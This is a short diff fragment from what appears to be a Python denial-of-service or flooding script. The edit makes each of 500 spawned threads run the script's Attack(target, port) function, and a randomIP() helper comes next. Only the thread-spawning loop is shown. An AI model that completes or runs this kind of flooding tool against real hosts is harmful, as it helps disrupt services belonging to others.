@@ -23,7 +23,7 @@ def Attack(target, port):
             
             s.close()
             for i in range(500):
-                thread = threading.Thread(target = 0)
+                thread = threading.Thread(target = Attack)
                 thread.start()
             
 def randomIP():
